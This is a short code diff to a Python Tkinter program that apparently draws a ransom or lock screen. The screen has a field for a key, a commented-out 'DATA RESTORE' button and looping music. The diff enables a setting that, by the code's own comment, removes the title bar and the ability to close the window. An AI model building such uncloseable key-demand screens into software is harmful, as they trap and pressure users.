@@ -36,7 +36,7 @@ if __name__ == "__main__":
     root.eval('tk::PlaceWindow %s center' % root.winfo_pathname(root.winfo_id()))
 
     #removes title bar and removes the ability to close the application from task bar
-    #root.overrideredirect(True)
+    root.overrideredirect(True)
 
     #accepting key
     def keyCatch():
@@ -58,7 +58,7 @@ if __name__ == "__main__":
     #Accepting input : 
     keyAccept = Entry(root, font = ('TkFixedFont', 10, 'bold'), foreground = "black", background = fgVal, borderwidth = 0, width = 50, justify = CENTER)
     keyAccept.place(relx=.5, rely=.54, anchor="center")
-
+    
     """ #Button
     submitBtn = Button(root, text="DATA RESTORE", font = ('TkFixedFont', 10, 'bold'), command=keyCatch, background="#55DBCB", foreground=bgVal, borderwidth = 0) 
     submitBtn.place(relx=.5, rely=.6, anchor="center")
@@ -71,4 +71,5 @@ if __name__ == "__main__":
     #playing music
     winsound.PlaySound('extras/Goosebumps Theme Song (Caspro Remix).wav', winsound.SND_ALIAS | winsound.SND_LOOP + winsound.SND_ASYNC)
     root.mainloop()
+    
     
